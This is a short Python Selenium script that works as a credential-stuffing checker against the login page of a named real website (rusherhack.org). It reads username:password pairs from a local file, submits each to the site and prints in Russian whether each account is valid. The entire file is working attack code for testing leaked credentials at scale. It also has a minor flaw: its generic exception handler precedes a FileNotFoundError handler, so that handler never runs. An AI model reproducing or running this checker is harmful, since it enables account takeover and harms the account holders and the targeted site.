from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

driver = webdriver.Chrome()
driver.get("https://www.rusherhack.org/users/login.php")

try:
    with open("rusher.tx", 'r', encoding='utf-8') as file_contents:
        lines = file_contents.readlines()
        for line in lines:
            login, password = line.strip().split(":")

            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            time.sleep(0.4)
            username_field.send_keys(login)
            time.sleep(0.1)
            password_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )
            time.sleep(0.4)
            password_field.send_keys(password)
            time.sleep(0.1)
            login_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'input.button[type="submit"]'))
            )
            login_button.click()

            if "https://www.rusherhack.org/users/index.php" in driver.current_url:
                print(f"[+] Аккаунт {login}:{password} годен")
            elif "https://www.rusherhack.org/users/login_validate.php" in driver.current_url:
                print(f"[-] Аккаунт {login}:{password} не годен")

            time.sleep(1)
            driver.get("https://www.rusherhack.org/users/login.php")

except Exception as Error:
    print(f"Неизвестная ошибка! {Error}")

except FileNotFoundError:
    print("Файл не найден")

finally:
    driver.quit()